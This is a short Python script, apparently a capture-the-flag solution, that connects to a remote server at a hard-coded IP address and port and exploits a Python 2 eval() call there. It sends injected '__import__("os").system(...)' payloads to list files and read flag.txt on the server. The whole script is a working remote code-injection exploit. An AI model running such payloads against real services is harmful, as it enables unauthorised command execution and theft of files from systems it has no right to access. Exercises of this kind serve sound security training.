import socket

HOST = '138.68.147.93'
PORT = 32065	  

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
	
    s.connect((HOST, PORT))
    data = s.recv(1024)
    print(data)

    # The receiver uses Python2 with an eval() function
    # think about using nc or telnet...

    s.send(b'__import__("os").system("ls")\n')
    data = s.recv(1024)
    print(data)

    s.send(b'__import__("os").system("cat flag.txt")\n')
    data = s.recv(1024)
    print(data)

